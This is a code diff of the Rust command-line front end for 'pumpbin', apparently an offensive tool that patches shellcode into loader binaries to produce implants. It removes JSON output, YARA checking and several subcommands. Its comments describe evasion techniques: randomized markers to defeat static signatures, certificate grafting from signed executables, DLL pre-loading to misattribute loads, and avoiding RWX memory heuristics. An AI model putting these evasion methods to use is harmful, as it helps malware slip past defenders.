@@ -1,14 +1,11 @@
 use anyhow::{anyhow, bail, Context, Result};
-use base64::{engine::general_purpose, Engine as _};
 use chrono::Local;
 use clap::{CommandFactory, Parser, Subcommand};
 use clap_complete::{generate, Shell};
-use dirs::home_dir;
 use owo_colors::OwoColorize;
 use pumpbin::plugin::Plugin;
 use pumpbin::{BinaryType, Platform, ShellcodeSaveType};
 use std::collections::BTreeMap;
-use std::ops::Not;
 use std::path::{Path, PathBuf};
 use std::process::Command;
 
@@ -40,71 +37,13 @@ macro_rules! pb_ok {
 #[command(author, version, about, long_about = None)]
 #[command(propagate_version = true)]
 struct Cli {
-    /// Disable the JSON log file sink (stderr console layer stays on).
-    /// Equivalent to `PUMPBIN_NO_LOG=1`.
-    #[arg(long, global = true, help_heading = "Output")]
-    no_log: bool,
-
     /// Override log level. Accepts EnvFilter syntax, e.g. `debug` or
-    /// `info,extism=warn`. Takes precedence over `PUMPBIN_LOG`.
+    /// `pumpbin=debug`. Takes precedence over `PUMPBIN_LOG`.
     #[arg(long, global = true, value_name = "FILTER", help_heading = "Output")]
     log_level: Option<String>,
 
-    /// Emit machine-readable JSON on stdout. Logs still go to stderr.
-    #[arg(long, global = true, help_heading = "Output")]
-    json: bool,
-
     #[command(subcommand)]
     command: Commands,
-}
-
-const CLI_JSON_SCHEMA: &str = "pumpbin.cli/v1";
-
-#[derive(serde::Serialize)]
-struct JsonEnvelope<T: serde::Serialize> {
-    schema: &'static str,
-    ok: bool,
-    #[serde(skip_serializing_if = "Option::is_none")]
-    data: Option<T>,
-    #[serde(skip_serializing_if = "Option::is_none")]
-    error: Option<JsonError>,
-}
-
-#[derive(serde::Serialize)]
-struct JsonError {
-    code: String,
-    message: String,
-}
-
-fn emit_json_ok<T: serde::Serialize>(data: T) {
-    let env = JsonEnvelope::<T> {
-        schema: CLI_JSON_SCHEMA,
-        ok: true,
-        data: Some(data),
-        error: None,
-    };
-    if let Ok(s) = serde_json::to_string(&env) {
-        println!("{s}");
-    }
-}
-
-fn emit_json_err(e: &anyhow::Error) {
-    let code = e
-        .downcast_ref::<pumpbin::PumpBinError>()
-        .map(|pb| pb.code().to_string())
-        .unwrap_or_else(|| "PB-E0000".to_string());
-    let env = JsonEnvelope::<()> {
-        schema: CLI_JSON_SCHEMA,
-        ok: false,
-        data: None,
-        error: Some(JsonError {
-            code,
-            message: e.to_string(),
-        }),
-    };
-    if let Ok(s) = serde_json::to_string(&env) {
-        println!("{s}");
-    }
 }
 
 #[derive(clap::ValueEnum, Clone, Debug)]
@@ -148,8 +87,8 @@ enum Commands {
 
         /// Post-build module to apply. Repeat to chain multiple.
         /// Plain id: `--post byte-patch`
-        /// With args: `--post byte-patch:patches=4831d2:4833d2,mode=all`
-        #[arg(long = "post", value_name = "ID[:K=V,K=V]")]
+        /// With one arg: `--post byte-patch:patches=4831d2:4833d2`
+        #[arg(long = "post", value_name = "ID[:K=V]")]
         post: Vec<String>,
 
         /// Preview what would be generated without writing anything.
@@ -165,14 +104,6 @@ enum Commands {
         /// Target binary type (exe, lib). Auto-detected from the .b1n.
         #[arg(short = 't', long = "type", help_heading = "Advanced")]
         binary_type: Option<String>,
-
-        /// Override module config key-values (repeatable).
-        #[arg(
-            long = "module-config",
-            value_name = "KEY=VALUE",
-            help_heading = "Advanced"
-        )]
-        module_config: Vec<String>,
     },
 
     /// Stamp every matching shellcode file in a directory.
@@ -203,10 +134,6 @@ enum Commands {
         /// the leading dot). Default: "bin".
         #[arg(long, default_value = "bin")]
         extension: String,
-
-        /// Override module config key-values (repeatable), e.g. --module-config padding_mb=8
-        #[arg(long = "module-config", value_name = "KEY=VALUE")]
-        module_config: Vec<String>,
     },
 
     /// Wrap a compiled loader binary as a reusable .b1n pack.
@@ -248,22 +175,14 @@ enum Commands {
         encrypt_module: Option<String>,
 
         /// Post-build module to bake into this .b1n.
-        /// Accepts `--post <id>` or `--post <id>:<k=v,k=v>`.
-        #[arg(long = "post", value_name = "ID[:K=V,K=V]")]
+        /// Accepts `--post <id>` or `--post <id>:<key=value>`.
+        #[arg(long = "post", value_name = "ID[:K=V]")]
         post_modules: Vec<String>,
 
         // --- Advanced ---
         /// Max placeholder region size (auto-measured from template if omitted).
         #[arg(long, help_heading = "Advanced")]
         max_len: Option<u64>,
-
-        /// Per-post-module config: IDX:KEY=VALUE (index matches --post order).
-        #[arg(
-            long = "post-config",
-            value_name = "IDX:KEY=VALUE",
-            help_heading = "Advanced"
-        )]
-        post_module_config: Vec<String>,
 
         /// Base module config key-values.
         #[arg(
@@ -296,8 +215,8 @@ enum Commands {
 
         /// Post-build module to apply. Repeat to chain multiple.
         /// Plain id: `--post cert-graft`
-        /// With args: `--post cert-graft:donor=/path/to/signed.exe,mode=fast`
-        #[arg(long = "post", value_name = "ID[:K=V,K=V]")]
+        /// With one arg: `--post cert-graft:donor=/path/to/signed.exe`
+        #[arg(long = "post", value_name = "ID[:K=V]")]
         post: Vec<String>,
 
         /// Also write the intermediate .b1n pack to this path for reuse
@@ -361,43 +280,6 @@ enum Commands {
     Inspect {
         /// Path to a .b1n loader pack or a compiled loader/implant binary.
         binary: PathBuf,
-
-        /// Check authenticode signature and PE checksum (for generated
-        /// implants). Replaces the old `verify` command.
-        #[arg(long)]
-        verify: bool,
-
-        /// One-line summary: name, supported slots, module count.
-        #[arg(long)]
-        brief: bool,
-
-        /// Optional second .b1n to diff against the first.
-        #[arg(long, value_hint = clap::ValueHint::FilePath)]
-        diff: Option<PathBuf>,
-
-        /// Print a short guide on embedding PumpBin markers, then exit.
-        #[arg(long)]
-        help_markers: bool,
-    },
-
-    /// Convert raw shellcode to hex, C, C#, Python, base64, or raw bytes.
-    Convert {
-        /// Path to the input shellcode file.
-        #[arg(short, long, value_hint = clap::ValueHint::FilePath)]
-        input: PathBuf,
-        /// Output format: raw | hex | c | csharp | python | base64.
-        #[arg(short, long)]
-        format: String,
-        /// Output file path. If omitted, writes to stdout.
-        #[arg(short, long, value_hint = clap::ValueHint::FilePath)]
-        output: Option<PathBuf>,
-    },
-
-    /// Build an implant from a pumpbin.toml profile.
-    Build {
-        /// Path to the pumpbin.toml profile.
-        #[arg(short = 'f', long, value_hint = clap::ValueHint::FilePath)]
-        profile: PathBuf,
     },
 
     /// List and test modules.
@@ -425,72 +307,12 @@ enum Commands {
         #[arg(long, default_value_t = pumpbin::scaffold::DEFAULT_PAD_BYTES, value_name = "BYTES")]
         padding_bytes: usize,
 
-        /// Replace the default `$$SHELLCODE$$` / `$$99999$$` markers
-        /// with a unique-per-scaffold random pair (13 ASCII chars +
-        /// 9-or-4 ASCII chars). Kills the cross-build static
-        /// signature for any operator shipping templates.
-        #[arg(long)]
-        randomize_markers: bool,
-
-        /// Use a 4-byte u32 little-endian size holder instead of the
-        /// 9-byte decimal ASCII default. PumpBin's patcher writes
-        /// `len.to_le_bytes()` into the slot and the loader parses
-        /// it with `u32::from_le_bytes(...)`. Useful for PIC loaders
-        /// that want to avoid dragging `core::fmt` for decimal
-        /// parsing. Saves 5 bytes in the placeholder slot.
-        #[arg(long)]
-        binary_size_holder: bool,
-
-        /// Windows-only: comma-separated DLL names to `LoadLibraryA`
-        /// from main() BEFORE the shellcode runs. The DLL load event
-        /// is then attributed to this loader's signed `.text` instead
-        /// of the anonymous RWX shellcode region. Names without `.dll`
-        /// get it auto-appended. Example: `ws2_32,kernel32`.
-        #[arg(long, value_delimiter = ',', value_name = "DLL[,DLL...]")]
-        pre_load_libs: Vec<String>,
-
-        /// Windows-only: emit `VirtualAlloc(PAGE_READWRITE)` +
-        /// `VirtualProtect(PAGE_EXECUTE_READ)` instead of single-step
-        /// `PAGE_EXECUTE_READWRITE`. Trades RWX-in-one-region heuristic
-        /// avoidance for a VirtualProtect transition event.
-        #[arg(long)]
-        no_rwx: bool,
-
         /// After scaffolding, immediately run `cargo build --release` and
         /// pack the resulting binary into a `.b1n`. Equivalent to running
         /// `pumpbin-cli pack <dest>` right after, but in one command.
         /// If the build or pack fails, the scaffold is still kept on disk.
         #[arg(long)]
         pack: bool,
-    },
-
-    /// Run YARA against a generated artifact.
-    Check {
-        /// Path to the artifact (PE, ELF, or any binary).
-        artifact: std::path::PathBuf,
-
-        /// Path to a YARA rule file or directory of rules. Directories
-        /// are scanned recursively (passes `-r` to yara).
-        #[arg(long, value_name = "PATH")]
-        yara_rules: std::path::PathBuf,
-
-        /// Override the path to the `yara` binary (default: search PATH).
-        #[arg(long, value_name = "PATH")]
-        yara_bin: Option<std::path::PathBuf>,
-    },
-
-    /// Find PE files with embedded Authenticode signatures.
-    ListDonors {
-        /// Directory to scan (non-recursive by default).
-        path: std::path::PathBuf,
-
-        /// Recurse into subdirectories.
-        #[arg(short, long)]
-        recursive: bool,
-
-        /// Print only files with an embedded signature.
-        #[arg(long)]
-        embedded_only: bool,
     },
 
     /// Print shell completion script to stdout.
@@ -566,35 +388,20 @@ fn main() -> Result<()> {
 
     let cli = Cli::parse();
 
-    // Install tracing subscriber driven by --no-log / --log-level flags
-    // (overriding PUMPBIN_NO_LOG / PUMPBIN_LOG env vars). init() is
-    // idempotent and never panics; failure to open the log file degrades
-    // silently to console-only.
+    // Install tracing subscriber driven by --log-level / PUMPBIN_LOG.
     let log_cfg = pumpbin::logging::LoggingConfig {
-        no_log_file: cli.no_log || std::env::var_os("PUMPBIN_NO_LOG").is_some(),
         level_override: cli.log_level.clone(),
-        log_dir_override: None,
     };
     let _ = pumpbin::logging::init(log_cfg);
     tracing::debug!("pumpbin-cli starting");
 
-    let result = dispatch(&cli);
-    // JSON error envelope: when --json is set and the dispatch errored,
-    // emit a structured error to stdout so CI parsers can match on the
-    // PB-Exxxx code. Then propagate the error so the process exit
-    // status is still non-zero.
-    if cli.json {
-        if let Err(e) = &result {
-            emit_json_err(e);
-        }
-    }
-    result
+    dispatch(&cli)
 }
 
 /// Exit codes:
 ///   0 — success
 ///   1 — error (bad input, I/O failure, plugin error)
-///   2 — partial / matches (YARA hits found, batch partial success)
+///   2 — partial batch success
 fn dispatch(cli: &Cli) -> Result<()> {
     match &cli.command {
         Commands::Generate {
@@ -603,7 +410,6 @@ fn dispatch(cli: &Cli) -> Result<()> {
             platform,
             binary_type,
             output,
-            module_config,
             dry_run,
             post,
         } => {
@@ -643,25 +449,20 @@ fn dispatch(cli: &Cli) -> Result<()> {
                 .get_that_binary(parsed_platform, parsed_binary_type)
                 .map(|b| b.to_vec())
                 .ok_or(anyhow!(
-                    "Failed to retrieve binary for platform/type combination"
+                    "failed to retrieve binary for platform/type combination"
                 ))?;
 
             plugin_obj.validate_shellcode_source(shellcode)?;
             let final_shellcode_src = shellcode.clone();
-            let mut runtime_config = parse_module_config(module_config)?;
+            let mut runtime_config = BTreeMap::new();
 
             // Append CLI-supplied post-build modules to the .b1n's chain.
             // Two forms accepted:
             //   --post <id>               plain id
-            //   --post <id>:<k=v,k=v>    id with comma-separated args
+            //   --post <id>:<k=v>        id with one key=value arg
             for entry in post {
-                let (id, args) = parse_post_entry(entry)?;
-                plugin_obj.plugins.modules_mut().push(id.clone());
-                if !args.is_empty() {
-                    runtime_config.insert(format!("post:{id}"), encode_post_args(&args));
-                }
+                append_post_entry(&mut plugin_obj.plugins.modules, &mut runtime_config, entry)?;
             }
-            let runtime_config = normalize_reserved_runtime_config(runtime_config)?;
             plugin_obj.validate_for_generation(parsed_platform, parsed_binary_type)?;
 
             // Resolve output path before dry-run so we can show it in the preview.
@@ -671,7 +472,7 @@ fn dispatch(cli: &Cli) -> Result<()> {
                 let ext = ext_for_output(parsed_platform, parsed_binary_type);
                 let base = plugin_obj
                     .info()
-                    .plugin_name()
+                    .plugin_name
                     .to_lowercase()
                     .replace(' ', "_");
                 let candidate = PathBuf::from(format!("{base}.{ext}"));
@@ -689,8 +490,7 @@ fn dispatch(cli: &Cli) -> Result<()> {
                 println!("DRY RUN: nothing will be written\n");
                 println!(
                     "  Pack:         {} (v{})",
-                    plugin_obj.info().plugin_name(),
-                    plugin_obj.info().version()
+                    plugin_obj.info.plugin_name, plugin_obj.info.version
                 );
                 println!(
                     "  Target:       {} / {}",
@@ -704,8 +504,8 @@ fn dispatch(cli: &Cli) -> Result<()> {
                     println!("  Shellcode:    {shellcode}");
                 }
                 // Show full pipeline: encrypt hook → post-build chain
-                let encrypt_hook = plugin_obj.plugins().encrypt_shellcode();
-                let chain = plugin_obj.plugins.modules();
+                let encrypt_hook = plugin_obj.plugins.encrypt_shellcode.as_deref();
+                let chain = plugin_obj.plugins.modules.as_slice();
                 if encrypt_hook.is_none() && chain.is_empty() {
                     println!("  Module chain: (none)");
                 } else {
@@ -723,7 +523,7 @@ fn dispatch(cli: &Cli) -> Result<()> {
             }
 
             let sc_size = std::fs::metadata(shellcode).map(|m| m.len()).unwrap_or(0);
-            let chain = plugin_obj.plugins.modules().to_vec();
+            let chain = plugin_obj.plugins.modules.as_slice().to_vec();
             if chain.is_empty() {
                 pb_info!(
                     plugin_label,
@@ -758,21 +558,7 @@ fn dispatch(cli: &Cli) -> Result<()> {
                 "wrote {}",
                 display_path.display()
             );
-            if !cli.json {
-                println!("{}", display_path.display());
-            }
-
-            if cli.json {
-                #[derive(serde::Serialize)]
-                struct GenerateResult {
-                    output: String,
-                    bytes: usize,
-                }
-                emit_json_ok(GenerateResult {
-                    output: display_path.display().to_string(),
-                    bytes: bin.len(),
-                });
-            }
+            println!("{}", display_path.display());
 
             Ok(())
         }
@@ -783,7 +569,6 @@ fn dispatch(cli: &Cli) -> Result<()> {
             binary_type,
             output_dir,
             extension,
-            module_config,
         } => {
             tracing::info!("Starting automated Batch generation");
 
@@ -799,8 +584,7 @@ fn dispatch(cli: &Cli) -> Result<()> {
             tracing::info!(pack = ?plugin_path, "Loading pack");
             let plugin_buf = std::fs::read(&plugin_path)?;
             let plugin_obj = Plugin::decode_from_slice(&plugin_buf)?;
-            let runtime_config = parse_module_config(module_config)?;
-            let runtime_config = normalize_reserved_runtime_config(runtime_config)?;
+            let runtime_config = BTreeMap::new();
 
             let (parsed_platform, parsed_binary_type) = plugin_obj
                 .bins()
@@ -829,7 +613,7 @@ fn dispatch(cli: &Cli) -> Result<()> {
             tracing::info!(%parsed_platform, %parsed_binary_type, "Validating plugin for target");
             plugin_obj.validate_for_generation(parsed_platform, parsed_binary_type)?;
 
-            let save_type = if plugin_obj.replace().size_holder().is_some() {
+            let save_type = if plugin_obj.replace.size_holder.as_ref().is_some() {
                 ShellcodeSaveType::Local
             } else {
                 ShellcodeSaveType::Remote
@@ -913,7 +697,7 @@ fn dispatch(cli: &Cli) -> Result<()> {
                     .get_that_binary(parsed_platform, parsed_binary_type)
                     .map(|b| b.to_vec())
                     .ok_or(anyhow!(
-                        "Failed to retrieve binary for platform/type combination"
+                        "failed to retrieve binary for platform/type combination"
                     ))?;
 
                 let data = match std::fs::read(path) {
@@ -966,7 +750,7 @@ fn dispatch(cli: &Cli) -> Result<()> {
                 let timestamp = now.format("%H%M%S").to_string();
                 let plugin_name_sanitized = plugin_clone
                     .info()
-                    .plugin_name()
+                    .plugin_name
                     .to_lowercase()
                     .replace(' ', "_");
                 let shellcode_name = path
@@ -1037,7 +821,6 @@ fn dispatch(cli: &Cli) -> Result<()> {
             max_len,
             encrypt_module,
             post_modules,
-            post_module_config,
             module_config,
         } => {
             let template_bytes = std::fs::read(template).with_context(|| {
@@ -1079,19 +862,11 @@ fn dispatch(cli: &Cli) -> Result<()> {
             }
 
             let mut cfg = parse_module_config(module_config)?;
-            for entry in post_module_config {
-                let (idx, key, value) = parse_post_module_config_entry(entry)?;
-                cfg.insert(format!("post_chain.{}.config.{}", idx, key), value);
-            }
 
-            // post_modules accepts both `--post id` and `--post id:k=v,k=v`
+            // post_modules accepts both `--post id` and `--post id:k=v`.
             let mut resolved_post_modules = vec![];
             for entry in post_modules {
-                let (id, args) = parse_post_entry(entry)?;
-                resolved_post_modules.push(id.clone());
-                if !args.is_empty() {
-                    cfg.insert(format!("post:{id}"), encode_post_args(&args));
-                }
+                append_post_entry(&mut resolved_post_modules, &mut cfg, entry)?;
             }
 
             let data = pumpbin::pack::B1nBuilder {
@@ -1200,8 +975,7 @@ fn dispatch(cli: &Cli) -> Result<()> {
                          so PumpBin knows where to write your shellcode.\n\n\
                          Options:\n  \
                          1. Build a marker-ready loader:  pumpbin-cli new-loader myloader --platform {platform_hint} --pack\n  \
-                         2. Embed the marker manually:    see pumpbin-cli inspect --help-markers\n  \
-                         3. Verify an existing binary:    pumpbin-cli inspect {loader}",
+                         2. Verify an existing binary:    pumpbin-cli inspect {loader}",
                         loader = loader.display(),
                         marker = marker,
                         platform_hint = platform
@@ -1232,11 +1006,7 @@ fn dispatch(cli: &Cli) -> Result<()> {
 
             let mut runtime_config = parse_module_config(&[])?;
             for entry in post {
-                let (id, args) = parse_post_entry(entry)?;
-                plugin_obj.plugins.modules_mut().push(id.clone());
-                if !args.is_empty() {
-                    runtime_config.insert(format!("post:{id}"), encode_post_args(&args));
-                }
+                append_post_entry(&mut plugin_obj.plugins.modules, &mut runtime_config, entry)?;
             }
 
             let (resolved_platform, resolved_binary_type) = plugin_obj
@@ -1248,15 +1018,16 @@ fn dispatch(cli: &Cli) -> Result<()> {
                 .bins()
                 .get_that_binary(resolved_platform, resolved_binary_type)
                 .map(|b| b.to_vec())
-                .ok_or_else(|| anyhow!("failed to retrieve binary for platform/type"))?;
+                .ok_or_else(|| {
+                    anyhow!("failed to retrieve binary for platform/type combination")
+                })?;
 
             plugin_obj.validate_shellcode_source(shellcode)?;
 
-            let runtime_config = normalize_reserved_runtime_config(runtime_config)?;
             let sc_bytes = std::fs::read(shellcode.as_str())
                 .with_context(|| format!("failed to read shellcode: {}", shellcode))?;
             let sc_size = sc_bytes.len();
-            let chain = plugin_obj.plugins.modules().to_vec();
+            let chain = plugin_obj.plugins.modules.as_slice().to_vec();
 
             let output_path = if let Some(out) = output {
                 out.clone()
@@ -1280,7 +1051,7 @@ fn dispatch(cli: &Cli) -> Result<()> {
             if *dry_run {
                 println!("DRY RUN: nothing will be written\n");
                 println!("  Loader:       {}", loader.display());
-                println!("  Pack:         {}", plugin_obj.info().plugin_name());
+                println!("  Pack:         {}", plugin_obj.info.plugin_name);
                 println!(
                     "  Target:       {} / {}",
                     resolved_platform, resolved_binary_type
@@ -1330,21 +1101,7 @@ fn dispatch(cli: &Cli) -> Result<()> {
                 target_label,
                 display_path.display()
             );
-            if !cli.json {
-                println!("{}", display_path.display());
-            }
-
-            if cli.json {
-                #[derive(serde::Serialize)]
-                struct StampResult {
-                    output: String,
-                    bytes: usize,
-                }
-                emit_json_ok(StampResult {
-                    output: display_path.display().to_string(),
-                    bytes: implant.len(),
-                });
-            }
+            println!("{}", display_path.display());
 
             Ok(())
         }
@@ -1354,146 +1111,21 @@ fn dispatch(cli: &Cli) -> Result<()> {
             output,
             skip_build,
         } => pack_crate(crate_dir, profile, output.as_deref(), *skip_build),
-        Commands::Inspect {
-            binary,
-            diff,
-            brief,
-            verify,
-            help_markers,
-        } => {
-            if *help_markers {
-                print_help_markers();
-                return Ok(());
-            }
-
-            // Auto-detect: if this looks like a raw binary (not a .b1n),
-            // run the loader marker scan (or --verify) instead of the .b1n inspector.
+        Commands::Inspect { binary } => {
             let bytes = std::fs::read(binary)
                 .with_context(|| format!("failed to read '{}'", binary.display()))?;
             let is_b1n = pumpbin::plugin::Plugin::decode_from_slice(&bytes).is_ok();
-            if *verify || !is_b1n {
-                if *verify {
-                    verify_binary(binary)?;
-                }
-                if !is_b1n {
-                    inspect_loader_binary(binary, &bytes, cli.json);
-                }
+            if !is_b1n {
+                inspect_loader_binary(binary, &bytes);
                 return Ok(());
             }
 
-            let left = pumpbin::inspect::inspect(binary)?;
-            if *brief {
-                // One-liner: name, populated slots, module count.
-                let slots: Vec<String> = left
-                    .platforms
-                    .iter()
-                    .flat_map(|p| {
-                        p.binary_types
-                            .iter()
-                            .map(|b| format!("{}/{}", p.name.to_lowercase(), b))
-                    })
-                    .collect();
-                let mods = left.modules.len();
-                let module_word = if mods == 1 { "module" } else { "modules" };
-                println!(
-                    "{:<24} {:<32} {} {}",
-                    left.plugin_name,
-                    slots.join(", "),
-                    mods,
-                    module_word
-                );
-                return Ok(());
-            }
-            if cli.json {
-                if let Some(other_path) = diff {
-                    let right = pumpbin::inspect::inspect(other_path)?;
-                    // JSON diff form: emit both reports + a diff field.
-                    #[derive(serde::Serialize)]
-                    struct DiffPayload<'a> {
-                        left: &'a pumpbin::inspect::InspectReport,
-                        right: &'a pumpbin::inspect::InspectReport,
-                        text: String,
-                    }
-                    let payload = DiffPayload {
-                        left: &left,
-                        right: &right,
-                        text: pumpbin::inspect::render_diff(&left, &right),
-                    };
-                    emit_json_ok(payload);
-                } else {
-                    emit_json_ok(&left);
-                }
-            } else if let Some(other_path) = diff {
-                let right = pumpbin::inspect::inspect(other_path)?;
-                print!("{}", pumpbin::inspect::render_diff(&left, &right));
-            } else {
-                print!("{}", pumpbin::inspect::render_text(&left));
-            }
-            Ok(())
-        }
-        Commands::Convert {
-            input,
-            format,
-            output,
-        } => {
-            let fmt = pumpbin::OutputFormat::from_str_ci(format).ok_or_else(|| {
-                anyhow::anyhow!(
-                    "Unknown format {format:?}. Expected one of: raw, hex, c, csharp, python, base64."
-                )
-            })?;
-            let bytes = std::fs::read(input)?;
-            let out = pumpbin::convert::convert(&bytes, fmt);
-            if let Some(out_path) = output {
-                pumpbin::utils::atomic_write(out_path, &out)?;
-                if cli.json {
-                    #[derive(serde::Serialize)]
-                    struct ConvertResult<'a> {
-                        input: &'a std::path::Path,
-                        output: &'a std::path::Path,
-                        input_bytes: usize,
-                        output_bytes: usize,
-                        format: String,
-                    }
-                    emit_json_ok(ConvertResult {
-                        input,
-                        output: out_path,
-                        input_bytes: bytes.len(),
-                        output_bytes: out.len(),
-                        format: format.clone(),
-                    });
-                } else {
-                    tracing::info!(output = %out_path.display(), bytes = out.len(), "Converted");
-                }
-            } else {
-                // stdout. Raw format writes bytes; everything else is ASCII.
-                use std::io::Write;
-                std::io::stdout().write_all(&out)?;
-            }
-            Ok(())
-        }
-        Commands::Build { profile } => {
-            tracing::info!(profile = ?profile, "Loading build profile");
-            let profile = pumpbin::Profile::from_toml(profile)?;
-            tracing::info!(
-                schema = %profile.schema,
-                pack = ?profile.pack.source,
-                platform = %profile.target.platform,
-                binary_type = %profile.target.binary_type,
-                "Profile loaded"
-            );
-            let artifact = profile.execute()?;
-            tracing::info!(
-                output = %artifact.output_path.display(),
-                bytes = artifact.bytes_written,
-                "Build complete"
-            );
-            if cli.json {
-                emit_json_ok(&artifact);
-            }
+            let report = pumpbin::inspect::inspect(binary)?;
+            print!("{}", pumpbin::inspect::render_text(&report));
             Ok(())
         }
         Commands::Module(sub) => match sub {
-            ModuleCommands::List { options, id } => list_modules(*options, id.as_deref(), cli.json),
+            ModuleCommands::List { options, id } => list_modules(*options, id.as_deref()),
             ModuleCommands::Test {
                 id,
                 input,
@@ -1576,10 +1208,6 @@ fn dispatch(cli: &Cli) -> Result<()> {
             name,
             platform,
             padding_bytes,
-            randomize_markers,
-            binary_size_holder,
-            pre_load_libs,
-            no_rwx,
             pack,
         } => {
             let dest = dest.as_path();
@@ -1597,10 +1225,6 @@ fn dispatch(cli: &Cli) -> Result<()> {
             }
             let opts = pumpbin::scaffold::LoaderOpts {
                 padding_bytes: *padding_bytes,
-                randomize_markers: *randomize_markers,
-                binary_size_holder: *binary_size_holder,
-                pre_load_libs: pre_load_libs.clone(),
-                no_rwx: *no_rwx,
             };
             pumpbin::scaffold::write_loader_scaffold(dest, &crate_name, parsed_platform, opts)?;
             tracing::info!(
@@ -1608,8 +1232,6 @@ fn dispatch(cli: &Cli) -> Result<()> {
                 name = %crate_name,
                 platform = %parsed_platform,
                 padding_bytes = padding_bytes,
-                randomized = randomize_markers,
-                binary_size = binary_size_holder,
                 "Scaffolded loader crate",
             );
             if *pack {
@@ -1631,19 +1253,6 @@ fn dispatch(cli: &Cli) -> Result<()> {
             }
             Ok(())
         }
-        Commands::Check {
-            artifact,
-            yara_rules,
-            yara_bin,
-        } => yara_check(artifact, yara_rules, yara_bin.as_deref()),
-        Commands::ListDonors {
-            path,
-            recursive,
-            embedded_only,
-        } => {
-            list_donors(path, *recursive, *embedded_only)?;
-            Ok(())
-        }
         Commands::Completions { shell } => {
             let mut cmd = Cli::command();
             let generator: Shell = shell.clone().into();
@@ -1653,7 +1262,7 @@ fn dispatch(cli: &Cli) -> Result<()> {
     }
 }
 
-fn list_modules(show_options: bool, only_id: Option<&str>, json: bool) -> Result<()> {
+fn list_modules(show_options: bool, only_id: Option<&str>) -> Result<()> {
     use pumpbin::modules::external::registry;
 
     let ext = registry();
@@ -1709,18 +1318,6 @@ fn list_modules(show_options: bool, only_id: Option<&str>, json: bool) -> Result
         .map(|want| descriptors.iter().any(|descriptor| descriptor.id == want))
         .unwrap_or_else(|| !descriptors.is_empty());
 
-    if json {
-        let rows: Vec<_> = descriptors
-            .iter()
-            .filter(|descriptor| only_id.is_none_or(|want| descriptor.id == want))
-            .collect();
-        emit_json_ok(rows);
-        for w in ext.warnings() {
-            eprintln!("warning: {w}");
-        }
-        return Ok(());
-    }
-
     print_section("encrypt", "encrypt");
     print_section("post_build", "post-build");
 
@@ -1734,159 +1331,6 @@ fn list_modules(show_options: bool, only_id: Option<&str>, json: bool) -> Result
 
     for w in ext.warnings() {
         eprintln!("warning: {w}");
-    }
-    Ok(())
-}
-
-fn yara_check(
-    artifact: &std::path::Path,
-    rules: &std::path::Path,
-    yara_bin_override: Option<&std::path::Path>,
-) -> Result<()> {
-    if !artifact.exists() {
-        return Err(anyhow!("artifact not found: {}", artifact.display()));
-    }
-    if !rules.exists() {
-        return Err(anyhow!("yara rules path not found: {}", rules.display()));
-    }
-
-    let yara_bin: std::path::PathBuf = match yara_bin_override {
-        Some(p) => p.to_path_buf(),
-        None => match which("yara") {
-            Some(p) => p,
-            None => {
-                return Err(anyhow!(
-                    "`yara` binary not found in PATH. Install it:\n  apt install yara       (Debian/Ubuntu)\n  brew install yara      (macOS)\n  pacman -S yara         (Arch)\nOr pass --yara-bin <path>."
-                ));
-            }
-        },
-    };
-
-    let mut cmd = std::process::Command::new(&yara_bin);
-    // -r recurses into rule directories (no-op for single files).
-    // -w suppresses YARA's own warnings so output is just matches.
-    cmd.arg("-r").arg("-w").arg(rules).arg(artifact);
-    let out = cmd
-        .output()
-        .map_err(|e| anyhow!("failed to spawn yara ({}): {e}", yara_bin.display()))?;
-
-    let stdout = String::from_utf8_lossy(&out.stdout);
-    let stderr = String::from_utf8_lossy(&out.stderr);
-
-    if !out.status.success() {
-        return Err(anyhow!(
-            "yara exited with {}: {}",
-            out.status,
-            stderr.trim()
-        ));
-    }
-
-    let matches: Vec<&str> = stdout.lines().filter(|l| !l.trim().is_empty()).collect();
-    if matches.is_empty() {
-        println!(
-            "clean: no YARA matches in {} against {}",
-            artifact.display(),
-            rules.display()
-        );
-        Ok(())
-    } else {
-        println!(
-            "{} YARA match(es) against {}:",
-            matches.len(),
-            artifact.display()
-        );
-        for m in &matches {
-            println!("  {m}");
-        }
-        std::process::exit(2)
-    }
-}
-
-fn which(name: &str) -> Option<std::path::PathBuf> {
-    let path = std::env::var_os("PATH")?;
-    for dir in std::env::split_paths(&path) {
-        let cand = dir.join(name);
-        if cand.is_file() {
-            return Some(cand);
-        }
-    }
-    None
-}
-
-fn list_donors(dir: &std::path::Path, recursive: bool, embedded_only: bool) -> Result<()> {
-    let mut files: Vec<std::path::PathBuf> = Vec::new();
-    collect_pe_paths(dir, recursive, &mut files)?;
-    files.sort();
-
-    if files.is_empty() {
-        eprintln!("no PE files found under {}", dir.display());
-        return Ok(());
-    }
-
-    let mut embedded = 0usize;
-    let mut catalog_only = 0usize;
-    let mut errored = 0usize;
-    for path in &files {
-        let bytes = match std::fs::read(path) {
-            Ok(b) => b,
-            Err(e) => {
-                eprintln!("  ! {}: read error: {e}", path.display());
-                errored += 1;
-                continue;
-            }
-        };
-        match pumpbin::pe::read_security_dir(&bytes) {
-            Ok((0, 0)) => {
-                if !embedded_only {
-                    println!("  catalog-only  {}", path.display());
-                }
-                catalog_only += 1;
-            }
-            Ok((off, sz)) => {
-                println!("  embedded ({sz:>7} B at 0x{off:08X})  {}", path.display());
-                embedded += 1;
-            }
-            Err(_) => {
-                // Not a PE, skip silently — directory may mix file types.
-            }
-        }
-    }
-    eprintln!(
-        "\n{} embedded, {} catalog-only, {} errored ({} files scanned under {})",
-        embedded,
-        catalog_only,
-        errored,
-        files.len(),
-        dir.display()
-    );
-    Ok(())
-}
-
-fn collect_pe_paths(
-    dir: &std::path::Path,
-    recursive: bool,
-    out: &mut Vec<std::path::PathBuf>,
-) -> Result<()> {
-    for entry in std::fs::read_dir(dir)? {
-        let entry = entry?;
-        let path = entry.path();
-        let ft = entry.file_type()?;
-        if ft.is_dir() {
-            if recursive {
-                let _ = collect_pe_paths(&path, true, out);
-            }
-            continue;
-        }
-        if !ft.is_file() {
-            continue;
-        }
-        let ext = path
-            .extension()
-            .and_then(|s| s.to_str())
-            .map(|s| s.to_ascii_lowercase());
-        if matches!(ext.as_deref(), Some("exe" | "dll" | "sys")) {
-            out.push(path);
-        }
     }
     Ok(())
 }
@@ -1913,7 +1357,7 @@ fn resolve_plugin_path(plugin: &Path) -> Result<PathBuf> {
 
 /// Inspect a raw loader binary for PumpBin shellcode markers.
 /// Called by `inspect` when the path is not a recognisable .b1n.
-fn inspect_loader_binary(path: &Path, bytes: &[u8], json: bool) {
+fn inspect_loader_binary(path: &Path, bytes: &[u8]) {
     use pumpbin::scaffold::{DEFAULT_PREFIX, DEFAULT_SIZE_HOLDER};
 
